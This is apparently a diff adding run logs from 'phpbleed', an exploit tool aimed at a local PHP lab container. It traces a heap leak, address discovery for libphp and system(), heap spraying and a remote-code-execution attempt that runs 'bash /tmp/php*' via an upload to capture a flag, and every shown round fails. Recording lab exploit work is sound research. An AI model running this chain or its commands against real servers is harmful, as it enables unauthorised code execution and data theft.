@@ -877,3 +877,465 @@ uid=33(www-d
   docker logs --tail 50 php-firing-range-bleed82-1
 
 [*] Total requests: 33 (crashes: 8)
+============================================================
+============================================================
+  phpbleed: heap -> ELF -> EG -> system() -> canary over HTTP
+  Target: http://127.0.0.1:8089/index.php
+============================================================
+18:49:42Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+  heap_ref = 0xed3f88a571a0
+  libphp           = 0xed3f8aaa0000
+  executor_globals = 0xed3f8b9c2e40 (offset 0xf22e40)
+  PLTGOT           = 0xed3f8b99ffe8
+  system() = 0xed3f8c0092c0
+  get_properties_for = handlers+0xc0
+18:49:42Z [R-6/R-7 round 1] opening fresh worker pin
+
+[Phase R-6] round 1: pinning one worker (keep-alive)
+18:49:42Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400720)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:49:42Z [R-6] S = 0xed3f88a78d18 (reqs=2)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 1)
+18:49:42Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:43Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:43Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:43Z [R-7 round 1] no capture (worker-died-after-capture-shot); next round
+18:49:43Z [R-6/R-7 round 2] opening fresh worker pin
+
+[Phase R-6] round 2: pinning one worker (keep-alive)
+18:49:43Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400720)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:49:43Z [R-6] S = 0xed3f88a78d18 (reqs=8)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 2)
+18:49:43Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:43Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:43Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:43Z [R-7 round 2] no capture (worker-died-after-capture-shot); next round
+18:49:43Z [R-6/R-7 round 3] opening fresh worker pin
+
+[Phase R-6] round 3: pinning one worker (keep-alive)
+18:49:43Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400720)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:49:43Z [R-6] S = 0xed3f88a78d18 (reqs=14)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 3)
+18:49:43Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:43Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:43Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:43Z [R-7 round 3] no capture (worker-died-after-capture-shot); next round
+18:49:43Z [R-6/R-7 round 4] opening fresh worker pin
+
+[Phase R-6] round 4: pinning one worker (keep-alive)
+18:49:43Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400720)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:49:44Z [R-6] S = 0xed3f88a78d18 (reqs=20)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 4)
+18:49:44Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:44Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:44Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:44Z [R-7 round 4] no capture (worker-died-after-capture-shot); next round
+18:49:44Z [R-6/R-7 round 5] opening fresh worker pin
+
+[Phase R-6] round 5: pinning one worker (keep-alive)
+18:49:44Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400720)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:49:44Z [R-6] S = 0xed3f88a78d18 (reqs=26)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 5)
+18:49:44Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:44Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:44Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:44Z [R-7 round 5] no capture (worker-died-after-capture-shot); next round
+18:49:44Z [R-6/R-7 round 6] opening fresh worker pin
+
+[Phase R-6] round 6: pinning one worker (keep-alive)
+18:49:44Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400720)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:49:44Z [R-6] S = 0xed3f88a78d18 (reqs=32)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 6)
+18:49:44Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:45Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:45Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:45Z [R-7 round 6] no capture (worker-died-after-capture-shot); next round
+18:49:45Z [R-6/R-7 round 7] opening fresh worker pin
+
+[Phase R-6] round 7: pinning one worker (keep-alive)
+18:49:45Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400720)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:49:45Z [R-6] S = 0xed3f88a78d18 (reqs=38)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 7)
+18:49:45Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:45Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:45Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:45Z [R-7 round 7] no capture (worker-died-after-capture-shot); next round
+18:49:45Z [R-6/R-7 round 8] opening fresh worker pin
+
+[Phase R-6] round 8: pinning one worker (keep-alive)
+18:49:45Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400720)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:49:45Z [R-6] S = 0xed3f88a78d18 (reqs=44)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 8)
+18:49:45Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:49:46Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:49:46Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:49:46Z [R-7 round 8] no capture (worker-died-after-capture-shot); next round
+18:49:46Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
+
+  No flag in HTTP stream yet; check 'their channel':
+  docker logs --tail 50 php-firing-range-bleed82-1
+
+[*] Total requests: 49 (crashes: 8)
+============================================================
+============================================================
+  phpbleed: heap -> ELF -> EG -> system() -> canary over HTTP
+  Target: http://127.0.0.1:8089/index.php
+============================================================
+18:51:40Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+  heap_ref = 0xed3f88a571a0
+  libphp           = 0xed3f8aaa0000
+  executor_globals = 0xed3f8b9c2e40 (offset 0xf22e40)
+  PLTGOT           = 0xed3f8b99ffe8
+  system() = 0xed3f8c0092c0
+  get_properties_for = handlers+0xc0
+18:51:40Z [R-6/R-7 round 1] opening fresh worker pin
+
+[Phase R-6] round 1: pinning one worker (keep-alive)
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6 round 1] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a581a0
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6] FAILED round 1 (spray slot not found)
+18:51:40Z [R-6/R-7 round 2] opening fresh worker pin
+
+[Phase R-6] round 2: pinning one worker (keep-alive)
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6 round 2] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a581a0
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6] FAILED round 2 (spray slot not found)
+18:51:40Z [R-6/R-7 round 3] opening fresh worker pin
+
+[Phase R-6] round 3: pinning one worker (keep-alive)
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6 round 3] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a581a0
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6] FAILED round 3 (spray slot not found)
+18:51:40Z [R-6/R-7 round 4] opening fresh worker pin
+
+[Phase R-6] round 4: pinning one worker (keep-alive)
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6 round 4] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6] FAILED round 4 (spray slot not found)
+18:51:40Z [R-6/R-7 round 5] opening fresh worker pin
+
+[Phase R-6] round 5: pinning one worker (keep-alive)
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6 round 5] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6] FAILED round 5 (spray slot not found)
+18:51:40Z [R-6/R-7 round 6] opening fresh worker pin
+
+[Phase R-6] round 6: pinning one worker (keep-alive)
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6 round 6] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6] FAILED round 6 (spray slot not found)
+18:51:40Z [R-6/R-7 round 7] opening fresh worker pin
+
+[Phase R-6] round 7: pinning one worker (keep-alive)
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6 round 7] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6] FAILED round 7 (spray slot not found)
+18:51:40Z [R-6/R-7 round 8] opening fresh worker pin
+
+[Phase R-6] round 8: pinning one worker (keep-alive)
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6 round 8] no slot; refreshing R-1 heap leak
+  spray slot not found; re-running R-1
+  new heap_ref = 0xed3f88a571a0
+18:51:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+18:51:40Z [R-6] FAILED round 8 (spray slot not found)
+18:51:40Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
+
+  No flag in HTTP stream yet; check 'their channel':
+  docker logs --tail 50 php-firing-range-bleed82-1
+
+[*] Total requests: 25 (crashes: 0)
+============================================================
+============================================================
+  phpbleed: heap -> ELF -> EG -> system() -> canary over HTTP
+  Target: http://127.0.0.1:8089/index.php
+============================================================
+18:53:07Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+  heap_ref = 0xed3f88a571a0
+  libphp           = 0xed3f8aaa0000
+  executor_globals = 0xed3f8b9c2e40 (offset 0xf22e40)
+  PLTGOT           = 0xed3f8b99ffe8
+  system() = 0xed3f8c0092c0
+  get_properties_for = handlers+0xc0
+18:53:07Z [R-6/R-7 round 1] opening fresh worker pin
+
+[Phase R-6] round 1: pinning one worker (keep-alive)
+18:53:07Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a6e200 (heap->size=393016)
+  spray slot verified @ 0xed3f88a6e0c0 (len=280, marker ok)
+  S = 0xed3f88a6e0d8
+18:53:07Z [R-6] S = 0xed3f88a6e0d8 (reqs=2)
+  S = 0xed3f88a6e0d8
+
+[Phase R-7] RCE trigger + canary exfil (round 1)
+18:53:07Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:07Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:07Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:07Z [R-7 round 1] no capture (worker-died-after-capture-shot); next round
+18:53:07Z [R-6/R-7 round 2] opening fresh worker pin
+
+[Phase R-6] round 2: pinning one worker (keep-alive)
+18:53:07Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a6e200 (heap->size=393016)
+  spray slot verified @ 0xed3f88a6e0c0 (len=280, marker ok)
+  S = 0xed3f88a6e0d8
+18:53:07Z [R-6] S = 0xed3f88a6e0d8 (reqs=8)
+  S = 0xed3f88a6e0d8
+
+[Phase R-7] RCE trigger + canary exfil (round 2)
+18:53:07Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:07Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:07Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:07Z [R-7 round 2] no capture (worker-died-after-capture-shot); next round
+18:53:07Z [R-6/R-7 round 3] opening fresh worker pin
+
+[Phase R-6] round 3: pinning one worker (keep-alive)
+18:53:07Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a6e200 (heap->size=393016)
+  spray slot verified @ 0xed3f88a6e0c0 (len=280, marker ok)
+  S = 0xed3f88a6e0d8
+18:53:07Z [R-6] S = 0xed3f88a6e0d8 (reqs=14)
+  S = 0xed3f88a6e0d8
+
+[Phase R-7] RCE trigger + canary exfil (round 3)
+18:53:07Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:07Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:07Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:07Z [R-7 round 3] no capture (worker-died-after-capture-shot); next round
+18:53:07Z [R-6/R-7 round 4] opening fresh worker pin
+
+[Phase R-6] round 4: pinning one worker (keep-alive)
+18:53:07Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a6e200 (heap->size=393016)
+  spray slot verified @ 0xed3f88a6e0c0 (len=280, marker ok)
+  S = 0xed3f88a6e0d8
+18:53:07Z [R-6] S = 0xed3f88a6e0d8 (reqs=20)
+  S = 0xed3f88a6e0d8
+
+[Phase R-7] RCE trigger + canary exfil (round 4)
+18:53:08Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:08Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:08Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:08Z [R-7 round 4] no capture (worker-died-after-capture-shot); next round
+18:53:08Z [R-6/R-7 round 5] opening fresh worker pin
+
+[Phase R-6] round 5: pinning one worker (keep-alive)
+18:53:08Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a6e200 (heap->size=393016)
+  spray slot verified @ 0xed3f88a6e0c0 (len=280, marker ok)
+  S = 0xed3f88a6e0d8
+18:53:08Z [R-6] S = 0xed3f88a6e0d8 (reqs=26)
+  S = 0xed3f88a6e0d8
+
+[Phase R-7] RCE trigger + canary exfil (round 5)
+18:53:08Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:08Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:08Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:08Z [R-7 round 5] no capture (worker-died-after-capture-shot); next round
+18:53:08Z [R-6/R-7 round 6] opening fresh worker pin
+
+[Phase R-6] round 6: pinning one worker (keep-alive)
+18:53:08Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a6e200 (heap->size=393016)
+  spray slot verified @ 0xed3f88a6e0c0 (len=280, marker ok)
+  S = 0xed3f88a6e0d8
+18:53:08Z [R-6] S = 0xed3f88a6e0d8 (reqs=32)
+  S = 0xed3f88a6e0d8
+
+[Phase R-7] RCE trigger + canary exfil (round 6)
+18:53:08Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:08Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:08Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:08Z [R-7 round 6] no capture (worker-died-after-capture-shot); next round
+18:53:08Z [R-6/R-7 round 7] opening fresh worker pin
+
+[Phase R-6] round 7: pinning one worker (keep-alive)
+18:53:08Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a6e200 (heap->size=393016)
+  spray slot verified @ 0xed3f88a6e0c0 (len=280, marker ok)
+  S = 0xed3f88a6e0d8
+18:53:08Z [R-6] S = 0xed3f88a6e0d8 (reqs=38)
+  S = 0xed3f88a6e0d8
+
+[Phase R-7] RCE trigger + canary exfil (round 7)
+18:53:08Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:09Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:09Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:09Z [R-7 round 7] no capture (worker-died-after-capture-shot); next round
+18:53:09Z [R-6/R-7 round 8] opening fresh worker pin
+
+[Phase R-6] round 8: pinning one worker (keep-alive)
+18:53:09Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a6e200 (heap->size=393016)
+  spray slot verified @ 0xed3f88a6e0c0 (len=280, marker ok)
+  S = 0xed3f88a6e0d8
+18:53:09Z [R-6] S = 0xed3f88a6e0d8 (reqs=44)
+  S = 0xed3f88a6e0d8
+
+[Phase R-7] RCE trigger + canary exfil (round 8)
+18:53:09Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:53:09Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+18:53:09Z [R-7 upload-exfil] docker-logs FLAG check: (none)
+18:53:09Z [R-7 round 8] no capture (worker-died-after-capture-shot); next round
+18:53:09Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
+
+  No flag in HTTP stream yet; check 'their channel':
+  docker logs --tail 50 php-firing-range-bleed82-1
+
+[*] Total requests: 49 (crashes: 8)
